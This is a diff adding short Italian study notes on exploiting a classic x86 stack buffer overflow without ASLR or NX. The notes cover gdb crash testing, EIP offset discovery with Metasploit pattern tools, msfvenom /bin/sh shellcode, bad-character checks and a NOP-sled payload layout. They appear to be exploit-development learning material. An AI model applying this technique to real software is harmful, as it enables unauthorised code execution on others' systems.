@@ -1,0 +1,35 @@
+x86 - NO ASLR - NO NX
+
+da gdb faccio "run $(python -c"print '\xFF' * 1200")"
+	1200 da cambiare, l'importante è che modifico EIP
+
+per vedere se ho modificato EIP, faccio "info registers"
+
+creo un pattern univoco con:
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 
+(lo metto in un file o lo stampo o whatever)
+
+in gdb faccio run $(python -c "print 'IL PATTERN' ")
+
+vedo l'info dei registri, mi copio il valore di EIP
+
+faccio:
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0xVALORE_EIP
+mi ritornerà un offset.
+
+ora posso provare facendo:
+run $(python -c "print '\x55' * OFFSET + '\x66' * 4")
+se EIP è 0x66666666, allora è tutto ok. ho il controllo di EIP
+
+Genero lo shellcode con: (cambia in base a necessità)
+msfvenom -p linux/x86/exec CMD="/bin/sh" --platform linux --arch x86 --format c --bad-chars "CHARS"
+
+per vedere i badchars metto nello stack (quindi prima di EIP) tutti i caratteri hex da \x00 a \xff, poi visiono la memoria con x/1000xb $esp+1000  (cambia 1000), e vedo quali caratteri vengono modificati o rimossi.
+
+ora posso creare il payload, che sarà formato così:
+
+FILLER * ( OFFSET - NOPS - SHELLCODESIZE) + \x90 * NOPS + SHELLCODE + INDIRIZZO TRA I NOP
+
+per vedere un indirizzo tra i nop faccio sempre x/1000xb %esp+qualcosa
+
+
